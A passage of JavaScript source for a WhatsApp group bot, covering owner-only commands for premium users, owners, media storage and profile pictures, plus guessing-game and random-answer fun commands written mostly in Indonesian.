prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await NanoBotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return replynano(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replynano(`The Number ${prrkek} Has Been Premium!`)
}
break
//=========================================\\
case 'delprem':
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} nomor\nExample ${prefix+command} 6285892928715`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replynano(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addvideo':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the video name?')
if (VideoNano.includes(q)) return replynano("The name is already in use")
let delb = await NanoBotz.downloadAndSaveMediaMessage(quoted)
VideoNano.push(q)
await fsx.copy(delb, `./data/NanoMedia/video/${q}.mp4`)
fs.writeFileSync('./data/NanoMedia/database/xeonvideo.json', JSON.stringify(VideoNano))
fs.unlinkSync(delb)
replynano(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the video name')
if (!VideoNano.includes(q)) return replynano("The name does not exist in the database")
let wanu = VideoNano.indexOf(q)
VideoNano.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonvideo.json', JSON.stringify(VideoNano))
fs.unlinkSync(`./data/NanoMedia/video/${q}.mp4`)
replynano(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoNano) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoNano.length}*`
replynano(teks)
}
break
case 'addimage':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the image name?')
if (ImageNano.includes(q)) return replynano("The name is already in use")
let delb = await NanoBotz.downloadAndSaveMediaMessage(quoted)
ImageNano.push(q)
await fsx.copy(delb, `./data/NanoMedia/image/${q}.jpg`)
fs.writeFileSync('./data/NanoMedia/database/xeonimage.json', JSON.stringify(ImageNano))
fs.unlinkSync(delb)
replynano(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the image name')
if (!ImageNano.includes(q)) return replynano("The name does not exist in the database")
let wanu = ImageNano.indexOf(q)
ImageNano.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonimage.json', JSON.stringify(ImageNano))
fs.unlinkSync(`./data/NanoMedia/image/${q}.jpg`)
replynano(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageNano) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageNano.length}*`
replynano(teks)
}
break
case 'addsticker':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the sticker name?')
if (NanoSticker.includes(q)) return replynano("The name is already in use")
let delb = await NanoBotz.downloadAndSaveMediaMessage(quoted)
NanoSticker.push(q)
await fsx.copy(delb, `./data/NanoMedia/sticker/${q}.webp`)
fs.writeFileSync('./data/NanoMedia/database/xeonsticker.json', JSON.stringify(NanoSticker))
fs.unlinkSync(delb)
replynano(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the sticker name')
if (!NanoSticker.includes(q)) return replynano("The name does not exist in the database")
let wanu = NanoSticker.indexOf(q)
NanoSticker.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonsticker.json', JSON.stringify(NanoSticker))
fs.unlinkSync(`./data/NanoMedia/sticker/${q}.webp`)
replynano(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of NanoSticker) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${NanoSticker.length}*`
replynano(teks)
}
break
case 'addvn':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the audio name?')
if (NanoVoiceNote.includes(q)) return replynano("The name is already in use")
let delb = await NanoBotz.downloadAndSaveMediaMessage(quoted)
NanoVoiceNote.push(q)
await fsx.copy(delb, `./data/assets/audio/${q}.mp3`)
fs.writeFileSync('./data/NanoMedia/database/xeonvn.json', JSON.stringify(NanoVoiceNote))
fs.unlinkSync(delb)
replynano(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the vn name')
if (!NanoVoiceNote.includes(q)) return replynano("The name does not exist in the database")
let wanu = NanoVoiceNote.indexOf(q)
NanoVoiceNote.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonvn.json', JSON.stringify(NanoVoiceNote))
fs.unlinkSync(`./data/assets/audio/${q}.mp3`)
replynano(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of NanoVoiceNote) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${NanoVoiceNote.length}*`
replynano(teks)
}
break
case 'addowner':
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await NanoBotz.onWhatsApp(bnnd)
if (ceknye.length == 0) return replynano(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replynano(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} nomor\nExample ${prefix+command} 6285892928715`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replynano(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let NanoBotz of prem) {
teks += `- ${NanoBotz}\n`
}
teks += `\n*Total : ${prem.length}*`
NanoBotz.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setexif': {
               if (!DanzTheCreator) return reply(mess.only.owner)
               if (!text) return replynano(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replynano(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break

case 'setppbot': case 'setbotpp': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!quoted) return replynano(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return replynano(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replynano(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var medis = await NanoBotz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await NanoBotz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replynano(`Success`)
} else {
var memeg = await NanoBotz.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replynano(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args.join(" ")) return replynano(`Use ${prefix+command} groupname`)
try {
let cret = await NanoBotz.groupCreate(args.join(" "), [])
let response = await NanoBotz.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
NanoBotz.sendMessage(m.chat, { text:teks, mentions: await NanoBotz.parseMention(teks)}, {quoted:m})
} catch {
replynano("Error!")
}
}
break
case 'myip': {
  if (!DanzTheCreator) return reply(mess.only.owner)
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
replynano("🔎 Ip Adress Anda Adalah: " + ip)
})
})
      }
  break
  case 'setpppanjang': {
    const jimp_1 = require('jimp')
    async function pepe(media) {
      const jimp = await jimp_1.read(media)
      const min = jimp.getWidth()
      const max = jimp.getHeight()
      const cropped = jimp.crop(0, 0, min, max)
      return {
        img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
        preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
      }
    }
    
      let q = m.quoted ? m.quoted : m
      let mime = (q.msg || q).mimetype || q.mediaType || ''
      if (/image/g.test(mime) && !/webp/g.test(mime)) {
        try {
          const media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
          let botNumber = await NanoBotz.decodeJid(NanoBotz.user.id)
          let { img } = await pepe(media)
          await NanoBotz.query({
            tag: 'iq',
            attrs: {
              to: botNumber,
              type:'set',
              xmlns: 'w:profile:picture'
            },
            content: [
              {
                tag: 'picture',
                attrs: { type: 'image' },
                content: img
              }
            ]
          })
          reply(`Sukses mengganti PP Bot`)
        } catch (e) {
          console.log(e)
          reply(`Terjadi kesalahan, coba lagi nanti.`)
        }
      } else {
        reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
      }
    }
    break 
//=================================================
  
  
  


































//================================================================
//case game
case 'tebakgambar': {
  if (!m.isGroup) return reply(mess.only.group)
let timeout = 60000
let id = m.chat
if (id in NanoBotz.tebakkata) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
async function tebakgambar() {
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
      img: result.img,
      jawaban: result.jawaban,
      deskripsi: result.deskripsi
    }}
  let tos = await tebakgambar ()
  console.log(tos)
 let caption = `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${tos.deskripsi}\nWaktu : 60s\nHadiah : 10.000 money`
 NanoBotz.tebakgambar[id] = [
    await NanoBotz.sendMessage(from, {caption: caption, image: {url: tos.img}}, {quoted: m}),
    tos,
 setTimeout(() => {
	if (NanoBotz.tebakgambar[id])
 replynano(`Waktu Habis\nJawaban:  ${tos.jawaban}\n\nIngin bermain? Ketik tebakgambar`)
 delete NanoBotz.tebakgambar[id]
 }, 60000)
	 ]
}
break
//==================================================================
case 'tebaklagu': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await JSON.parse(fs.readFileSync('./lib/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await NanoBotz.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 NanoBotz.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 NanoBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
}
break
case 'tebakkata': {
if (!m.isGroup) return reply(mess.only.group)
  let timeout = 60000
  let id = m.chat
	if (id in NanoBotz.tebakkata) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let caption = `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${json.soal}\nWaktu : 60s\nHadiah : 10.000 money`
 NanoBotz.tebakkata[id] = [
	await replynano(`${caption}`),
	json,
 setTimeout(() => {
 if (NanoBotz.tebakkata[id]) 
 console.log("Jawaban: " + json.jawaban)
 replynano(`Waktu Habis\nJawaban:  ${json.jawaban}\n\nIngin bermain? Ketik tebakkata`) 
 delete NanoBotz.tebakkata[id]
 }, 60000)
 ]
}
break
//==================================================================
case 'tebakkalimat': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 NanoBotz.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 NanoBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'caklontong': {
  if (!m.isGroup) return reply(mess.only.group)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 NanoBotz.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 NanoBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'family100': {
  if (!m.isGroup) return reply(mess.only.group)
  let winScore = 10000
 let id = m.chat
	if (id in NanoBotz.family100) return replynano('Masih Ada Sesi Yang Belum Diselesaikan!')
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n\nSoal : ${json.soal}\n\nHadiah : 10.000 money\n\nTerdapat *${json.jawaban.length}* Jawaban ${json.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 NanoBotz.family100[id] = {
			id,
			msg: await replynano(`${hasil}`),
			...json,
			terjawab: Array.from(json.jawaban, () => false),
      winScore,  
        }
}
break
//==================================================================
case 'tebaktebakan': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
    tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    NanoBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m)
    delete tebaktebakan[m.sender.split('@')[0]]
}}
break
//==================================================================
case 'tebakbendera': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    NanoBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakbenderav2': {
  if (!m.isGroup) return reply(mess.only.group)
 if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    NanoBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakkabupaten': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
let result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
    tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
})
await sleep(60000)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.title)
    NanoBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m)
    delete tebakkabupaten[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakkimia': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, m).then(() => {
    tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase()
})
await sleep(60000)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.lambang)
    NanoBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m)
    delete tebakkimia[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'asahotak': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')
let result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
    tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    NanoBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m)
    delete tebakasahotak[m.sender.split('@')[0]]
}}
break
//==================================================================
case 'siapaaku':{
  if (!m.isGroup) return reply(mess.only.group)
  let users = global.db.users[m.sender]
	let timeout = 60000 
	let poin = 10000
	let id = m.chat 
	if (id in NanoBotz.siapaaku) return replynano('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	NanoBotz.siapaaku[id] = [
	await replynano(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (NanoBotz.siapaaku[id]) 
users.money -= 200
replynano(`*GAME SIAPAKAH AKU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].money.toLocaleString()}*`)
	delete NanoBotz.siapaaku[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'susunkata':{
  if (!m.isGroup) return reply(mess.only.group)
	let timeout = 60000
	let poin = 10000
	let id = m.chat
	if (id in NanoBotz.susunkata) return replynano('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
Tipe: ${json.tipe}
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	NanoBotz.susunkata[id] = [
	await replynano(`${caption}`),
	json, poin,
	setTimeout(() => {
replynano(`*GAME SUSUN KATA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].money.toLocaleString()}*`)
	delete NanoBotz.susunkata[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'tekateki':{
  if (!m.isGroup) return reply(mess.only.group)
	let timeout = 60000
	let users = global.db.users[m.sender]
	let poin = 10000
	let id = m.chat
	if (id in NanoBotz.tekateki) return replynano('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Bonus: ${poin} XP
	Hadiah: ${poin} Money 💸
	`.trim()
	NanoBotz.tekateki[id] = [
	await replynano(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (NanoBotz.tekateki[id]) 
users.money -= 200
replynano(`*GAME TEKA-TEKI*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.users[sender].money.toLocaleString()}*`)
	delete NanoBotz.tekateki[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'tebakbendera2': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    NanoBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera2[m.sender.split('@')[0]]}`, m)
    delete tebakbendera2[m.sender.split('@')[0]]
}
}
break
case 'math': case 'matematika': {
  if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesi Yang Belum Di Selesaikan.")
  let { genMath, modes } = require('./lib/math')
  if (!text) return replynano(`Mode: ${Object.keys(modes).join(' | ')}\npilih contoh: ${prefix}matematika medium`)
  let result = await genMath(text.toLowerCase())
  NanoBotz.sendText(m.chat, `*hasil dari: ${result.soal.toLowerCase()}*?\n\nwaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
  kuismath[m.sender.split('@')[0]] = result.jawaban
  })
  await sleep(result.waktu)
  if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
  console.log("jawaban: " + result.jawaban)
  replynano("waktu habis!!!\njawabannya: " + kuismath[m.sender.split('@')[0]])
  delete kuismath[m.sender.split('@')[0]]
  }
}
      
  break









//==================================================================
//case fun
case 'oi':{
    m.reply("paan bro 🗿☕") 
    }
break
    case 'bisakah': {
        if (!text) return m.reply(`contoh : ${prefix + command} saya menang?`) 
        const bisa = ['Bisa😎','Coba Saja😁','Pasti Bisa🤗','Mungkin Saja🙄','Tidak Bisa😮‍💨','Tidak Mungkin🥶','Coba Ulangi🧐','Ngimpi kah?😹','yakin bisa?']
        const keh = bisa[Math.floor(Math.random() * bisa.length)]
        NanoBotz.sendMessage(from, { text: `*PER..TANYAAN BAGUS MEN ☕*\n\nPertanyaan : *bisakah ${text}*\njawaban :*${keh}*` }, { quoted: m }) 
    }
    break
    case 'apakah': {
        if (!text) return m.reply(`contoh : ${prefix + command} saya menang?`) 
        const apa = ['Iya','Tidak','Bisa Jadi','Coba Ulangi','Mungkin Saja','Coba Tanyakan Dukun']
        const kah = apa[Math.floor(Math.random() * apa.length)]
        NanoBotz.sendMessage(from, { text: `*PER..TANYAAN BAGUS MEN ☕*\n\nPertanyaan : *apakah ${text}*\njawaban : *${kah}*` }, { quoted: m })
    }
    break
    case 'kapan': case 'kapankah': {
        if (!text) return m.reply(`contoh : ${prefix + command} saya menang?`) 
        const kapan = ['Besok','Lusa','Nanti','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Bulan Depan','Nanti','Tidak Akan Pernah']
        const kih = kapan[Math.floor(Math.random() * kapan.length)]
        NanoBotz.sendMessage(from, { text: `*PER..TANYAAN BAGUS MEN ☕*\n\nPertanyaan : *kapankah ${text}*\njawaban : *${kih}*` }, { quoted: m })
    }
break

case 'cekkodam':
  if (!text) return replynano('contoh: .cekkodam agus');
  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }
  const ceknyaa = pickRandom(['Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa', 'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana', 'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa', 'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Setan Merah', 'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang', 'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung', 'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar', 'Burung Hantu', 'Ikan Cupang']);
  const damping = pickRandom(['1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'lahir']);
  const khodam = `khodam ${text}, adalah ${ceknyaa}, mendampingi dari ${damping}`;

